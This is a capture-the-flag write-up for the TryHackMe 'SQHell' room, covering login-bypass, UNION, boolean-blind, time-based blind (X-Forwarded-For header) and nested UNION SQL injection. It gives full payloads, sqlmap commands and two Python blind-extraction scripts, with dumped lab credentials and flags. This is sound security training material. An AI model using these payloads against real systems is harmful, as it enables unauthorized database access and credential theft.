# 89 - SQHell (SQLI types and exploitation)

Room Link --> [https://tryhackme.com/room/sqhell](https://tryhackme.com/room/sqhell)

## SQLi Resources

* [https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)
* [https://github.com/Y000o/sql\_injection\_basic/blob/master/sql\_injection\_basic\_en.md](https://github.com/Y000o/sql\_injection\_basic/blob/master/sql\_injection\_basic\_en.md)
* [https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
* [https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/)

#### Cheatsheet

{% file src=".gitbook/assets/binca_sql-injection_cheetsheet.pdf" %}

## Flag 1 - In-band SQLI / Time-Based Blind

The login page.

```sql
admin' OR 1=1-- -
```

### Using Curl:

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ curl http://sqhell.thm/login -X POST -d "username=admin' or 1=1-- -&password=admin" | html2text 

Login Register
****** Logged In ******
Logged In
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}

```
{% endcode %}

### Using SQLMap

**Type**: time-based blind

{% code overflow="wrap" %}
```bash
# 1
sqlmap -u "http://sqhell.thm/login" --data "username=admin&password=admin"

POST parameter 'username' is vulnerable.
[09:23:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12

# 2
# DBs / Schemas
sqlmap -u "http://sqhell.thm/login" --data "username=admin&password=admin" --batch --dbms=mysql --dbs --threads 10

available databases [2]:
[*] information_schema
[*] sqhell_2

# 3
# Dump tables for "sqhell_2" DB.
sqlmap -u "http://sqhell.thm/login" --data "username=admin&password=admin" --batch --dbms=mysql --threads 10 -D sqhell_2 --tables

Database: sqhell_2
[1 table]
+-------+
| users |
+-------+

# 4
# columns for the "users" table.
sqlmap -u "http://sqhell.thm/login" --data "username=admin&password=admin" --batch --dbms=mysql --threads 10 -D sqhell_2 -T users --dump-all

Database: sqhell_2
Table: users
[1 entry]
+----+---------------------------------+----------+
| id | password                        | username |
+----+---------------------------------+----------+
| 1  | icantrememberthispasswordcanyou | admin    |
+----+---------------------------------+----------+

```
{% endcode %}

With the password found for the admin user we can either login in via the browser or use curl again to get the flag.

{% code overflow="wrap" %}
```bash
dking@dking ~/Downloads$ curl -s http://sqhell.thm/login -X POST -d "username=admin&password=icantrememberthispasswordcanyou" | html2text 


Login Register
****** Logged In ******
Logged In
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
```
{% endcode %}

## Flag 5 - In-Band/Union

In the [http://sqhell.thm/post?id=1](http://sqhell.thm/post?id=1) page.

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using BurpSuite

There are 4 columns here.

{% code overflow="wrap" %}
```sql
# 1
# no of columns
1 UNION SELECT 1,2,3,4-- -

# 2
# DBs / Schema name.
-1 UNION ALL SELECT 1,database(),3,4-- -

sqhell_5

# All the DBs / Schemas.
-1 UNION ALL SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata-- -

information_schema,sqhell_5

# 3
# tables in the "sqhell_5" DB.
-1 UNION ALL SELECT 1,group_concat(table_name),3,4 from information_schema.tables where table_schema="sqhell_5"-- -
# or
-1 UNION ALL SELECT 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()-- -

flag,posts,users

# 4
# columns in the "flag" table.
-1 UNION ALL SELECT 1,group_concat(column_name),3,4 from information_schema.columns where table_name="flag"-- -

id,flag

# 5
# dump data for the "flag" table.
-1 UNION ALL SELECT 1,group_concat(id,flag),3,4 FROM sqhell_5.flag-- -

1THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```
{% endcode %}

### Using Sqlmap

{% code overflow="wrap" %}
```bash
# 1
sqlmap -u "http://sqhell.thm/post?id=2" -p "id" --batch --dbs --dbms=mysql --threads 10

available databases [2]:
[*] information_schema
[*] sqhell_5

# can continue from here.....
```
{% endcode %}

## Flag 3 - Blind/Boolean

#### Blind Based SQLI / Boolean Based

&#x20;found [this](https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/) guide, which is a good in depth look at blind or boolean based attacks.

First looking at the Register page to see what we are dealing with:

![sqhell-register](https://pencer.io/assets/images/2021-06-14-22-09-41.png)

If we try admin as the user we see a message saying it’s taken:

![sqhell-admin](https://pencer.io/assets/images/2021-06-14-22-10-40.png)

If we try test as the user we see a message saying it’s available:

![sqhell-test](https://pencer.io/assets/images/2021-06-14-22-11-36.png)

Looking at the source code for the page we see how this works:

```
<script>
    $('input[name="username"]').keyup(function(){
        $('.userstatus').html('');
        let username = $(this).val();
        $.getJSON('/register/user-check?username='+ username,function(resp){
            if( resp.available ){
                $('.userstatus').css('color','#80c13d');
                $('.userstatus').html('Username available');
            }else{
                $('.userstatus').css('color','#F00');
                $('.userstatus').html('Username already taken');
            }
        });
    });
</script>
```

The script section calls a function called user-check to see if the name you’ve entered is available. We can visit this endpoint directly:

![sqhell-user-check](https://pencer.io/assets/images/2021-06-14-22-15-40.png)

Here we see the JSON output showing us the username isn’t available.

![sqhell-test-user](https://pencer.io/assets/images/2021-06-14-22-22-09.png)

{% hint style="success" %}
Now what this means is that, if the username entered already exists in the database, we get **"Username is already taken"** in the frontend but the backend **"/user-check?username="** json api returns `false` meaning that "admin" already exists and is a `Truthy` statement, while the reverse is a `Falsy` statement because the username dosen't exist in the database.

Knowing this, we can craft a SQLI payload that must amount to a `Truthy` statement ie (return `false` from the api.)
{% endhint %}

Lets craft a payload and use burpsuite to test.

### Using Burpsuite and Python

{% code overflow="wrap" lineNumbers="true" %}
```bash
# 1
# lets get the length of the database() string.
admin' AND (length(database())) = 1-- - 
# returns "true" from the api, meaning a Falsy statement, and that the length of the database is more than 1.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# 2
admin' AND (length(database())) = 2-- -
# also returns "true" from the api. so we keep going.
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" %}
```bash
# 3
admin' AND (length(database())) = 8-- -
# returns "false" from the api. This is our Truthy statement. And the length of the DB string is 8.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we can now get the DB/Schema name knowing the length is 8.

we will use ASCII code. The **ASCII code** associates an integer value for all symbols in the character set, such as letters, digits, punctuation marks, special characters, and control characters.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# check if the ascii char of the 1st letter is > 100.
admin' AND (ascii(substr((select database()),1,1))) > 100-- -

# output
{"available":false}

# meaning a Truthy statement.
```
{% endcode %}

{% code overflow="wrap" %}
```bash
admin' AND (ascii(substr((select database()),1,1))) > 120-- -

# outputs
{"available":true}
```
{% endcode %}

So it is between 100 and 120. After playing with it, i found it is 115 (**115 is "s" in ascii**).

This method can be tedious, we can use Burp intruder. But in real life engagement we can use this method to quickly get the info from the db so as not to trigger the WAF.

I can assume the db name is `sqhell_x`  so lets find out the value of `x` .

{% code overflow="wrap" %}
```bash
# we can use the "=" sign if we are certain of the value.
# 1st char.
admin' AND (ascii(substr((select database()),1,1))) = 115-- -
# 2nd char.
admin' AND (ascii(substr((select database()),2,1))) = 113-- -
# 3rd char.
admin' AND (ascii(substr((select database()),3,1))) = 104-- -
# 4th char.
admin' AND (ascii(substr((select database()),4,1))) = 101-- -
# 5th char.
admin' AND (ascii(substr((select database()),5,1))) = 108-- -
# 6th char.
admin' AND (ascii(substr((select database()),6,1))) = 108-- -
# 7th char.
admin' AND (ascii(substr((select database()),7,1))) = 95-- -
# 8th char.
admin' AND (ascii(substr((select database()),8,1))) = 51-- -

sqhell_3
```
{% endcode %}

We can use this python script to authomate the process and find the flag.

```python
import requests
import string

server = "sqhell.thm" # IP OR SERVERNAME IF IN HOST FILE
flag = ""
loop = 1

while chr(125) not in flag:
    for a in range(48,126):
        req = requests.get("http://" + server + f"/register/user-check?username=admin' AND (ASCII(SUBSTR((SELECT flag FROM sqhell_3.flag),{loop},1))) = '{a}'-- -")
        if 'false' in req.text:
             flag += chr(a)
             loop += 1
             print("Finding Flag: ", flag, end="\r")
             break
print("Flag found: ", flag)
```

```bash
dking@dking ~/Downloads$ source /home/dking/myenv_python3_9/bin/activate
(myenv_python3_9) dking@dking ~/Downloads$ python script.py
Flag found:  THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}8}
```

### USing SQLMAP

```bash
sqlmap -u http://sqhell.thm/register/user-check?username=admin --dbms=MySQL --dump
```

## Flag 2 - Blind / Time

Flag 2 has a hint on the room description, it says:

```
Make sure to read the terms and conditions ;)
```

Let’s see what we have:

![sqhell-t\&c](https://pencer.io/assets/images/2021-06-16-22-55-40.png)

It mentions logging the visitors IP. A search online found [this](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) that explains the process:

{% code overflow="wrap" %}
```
The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address
of a client connecting to a web server through an HTTP proxy or a load balancer.
```
{% endcode %}

### XFF Injection / X-Forwarded-For Injection

A further search on how to exploit XFF for time based SQLi I found lots of articles. [This](https://www.programmersought.com/article/466012852/) is a good one, with plenty of detail and examples. And also [this](https://resources.infosecinstitute.com/topic/sql-injection-http-headers/) one. First let’s try to manually check using curl:

#### Assuming We don't know name of the DB/Schema

I have written a payload that gets the name of the DB utilizing `XFF injection` .

{% code overflow="wrap" lineNumbers="true" %}
```bash
# this is saying if the ascii char of the 1st letter of the "database or schema_name" is 115 ie ("s"), then sleep for 5 seconds.
curl -H "X-Forwarded-For:-1' AND (SELECT sleep(5) FROM information_schema.schemata WHERE (ASCII(SUBSTR(schema_name,1,1))) = '115')-- -" http://sqhell.thm

# or
curl -H "X-Forwarded-For:-1' AND (SELECT sleep(5) FROM information_schema.schemata WHERE (ASCII(SUBSTR(database(),1,1))) = '115')-- -" http://sqhell.thm

# we confirm this is working, we can go on and on and get the other characters.
# db name is.
sqhell_1
```
{% endcode %}

We already know table name and column names are "flag" and "flag".

#### Getting Flag 2

{% code overflow="wrap" %}
```bash
curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '84'); -- -" http://sqhell.thm
```
{% endcode %}

Here I’m assuming the first character of the flag is T like all the others. 84 is the ASCII value of T, and I’m sending that via the X-Forwarded-For header. The sleep(5) will visibly pause the output for 5 seconds, so we know there was a match if we get a delay.

This worked for the first letter of the flag, let’s do the second one which will be a H:

{% code overflow="wrap" %}
```bash
curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,2,1))) = '72'); --+" http://sqhell.thm
```
{% endcode %}

We test 72 which is the ASCII value of H and again get a five second delay. This tells us we have a match, and like before we can continue on this path to manually work out the flag. Of course that would be incredibly time consuming, so let’s write a script to automate it:

```python
import requests
import time
import string

server = "sqhell.thm" # IP OR SERVERNAME IF IN HOST FILE
flag = ""
loop = 1

while chr(125) not in flag:
    for a in range(48,126):
        start = time.time()
        r = requests.get(url="http://" + server, headers={'X-Forwarded-For':f"1' AND (SELECT sleep(2) FROM flag where (ASCII(SUBSTR(flag,{loop},1))) = '{a}')-- -"})
        end = time.time()
        if end-start >= 2:
            flag += chr(a)
            loop += 1
            print("Finding Flag: ", flag, end="\r")
            break
print("Flag found: ", flag)

```

```bash
dking@dking ~/Downloads$ source /home/dking/myenv_python3_9/bin/activate
(myenv_python3_9) dking@dking ~/Downloads$ python script.py
Flag found:  THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}5}
```

Just like the last script this is a simple loop, repeating the same time based check using the XFF header as we did with curl:

### Using SQLMap

{% code overflow="wrap" lineNumbers="true" %}
```bash
sqlmap  -u http://sqhell.thm --headers="X-forwarded-for:1*" --dbms mysql
# outputs
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
(custom) HEADER parameter 'X-forwarded-for #1*' is vulnerable.
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" %}
```bash
sqlmap --dbms mysql --headers="X-forwarded-for:1*" -u http://sqhell.thm --dump
# outputs
Database: sqhell_1
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15} |
+----+---------------------------------------------+
```
{% endcode %}

## Flag 4 - Out-of-band

We have another hint, this time is says:

```
Well, dreams, they feel real while we're in them right?
```

A quick search of that reveals it’s a quote from the movie Inception:

{% code overflow="wrap" %}
```
Cobb: Well, dreams, they feel real while we're in them right? Its only when we wake up then we realize that something was actually strange.
Inception - Movie Quotes - Rotten Tomatoes
```
{% endcode %}

I didn’t know where to start with this one, but searching for “SQLi inception” found [this](https://www.contextis.com/en/blog/sql-inception-how-to-select-yourself) article. And the basic idea is we are looking at a UNION query inside a UNION query.

So first let’s look at the last page which we haven’t visited yet:

![sqhell-users](https://pencer.io/assets/images/2021-06-21-21-48-40.png)

We see that just like on the posts page there is a parameter. Let’s test to see if we can inject like before:

![sqhell-users-or](https://pencer.io/assets/images/2021-06-21-21-56-45.png)

Adding AND 1=1 results in a true statement which proves we can inject here. Now we need to determine the number of columns in the table just like we did for flag 5. We do this the same way using the ORDER BY statement.

So just like before we start with ORDER BY 1, then ORDER BY 2, and so on until we get to ORDER BY 4 where we see an error:

![sqhell-users-order](https://pencer.io/assets/images/2021-06-21-22-05-34.png)

Now we know how many columns we have we can use a UNION statement to test which ones are visible:

```
http://sqhell.thm/user?id=1337 union select 1,2,3
```

![sqhell-users-union](https://pencer.io/assets/images/2021-06-21-22-14-15.png)

Here we’ve used a false ID, which would result in an error but instead we’ve used the UNION statement to retrieve the column numbers. Now we know column one and two are useable we can retrieve the user and database:

```
http://sqhell.thm/user?id=1337 union select database(),user(),null
```

![sqhell-users-db](https://pencer.io/assets/images/2021-06-21-22-27-18.png)

Next we want to see the tables in the database and can use the same query as before:

{% code overflow="wrap" %}
```
http://sqhell.thm/user?id=1337 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
```
{% endcode %}

However this time when we ask for all tables using group\_concat we only see the one user table:

<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

We know a different database contains the posts table, but we find the expected flag table can’t be queried here. It’s at this point that we need to go back to the hint about running a query inside a query. And we again need to determine the number of columns:

{% code overflow="wrap" %}
```
http://sqhell.thm/user?id=1337 union select "1 order by 1-- -",2,3 from information_schema.tables where table_schema=database()
```
{% endcode %}

![sqhell-users-order](https://pencer.io/assets/images/2021-06-22-21-53-38.png)

Here I’ve just added an ORDER BY query to the end of the UNION SELECT 1, and enclosed it in quotes so it gets evaluated. As before we keep adding columns until we something changes:

{% code overflow="wrap" %}
```
http://sqhell.thm/user?id=1337 union select "1 order by 1,2,3,4,5-- -",2,3 from information_schema.tables where table_schema=database()
```
{% endcode %}

![sqhell-users-orderby5](https://pencer.io/assets/images/2021-06-22-21-54-52.png)

We can see at five columns the posts disappear. This tells us there are four columns. Now we can use the same query as before to get the flag from the flag table:

{% code overflow="wrap" %}
```
http://sqhell.thm/user?id=1337 union select "1 union select 1,flag,3,4 from flag-- -",2,3 from information_schema.tables where table_schema=database()
```
{% endcode %}

`THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}`&#x20;

### Done!

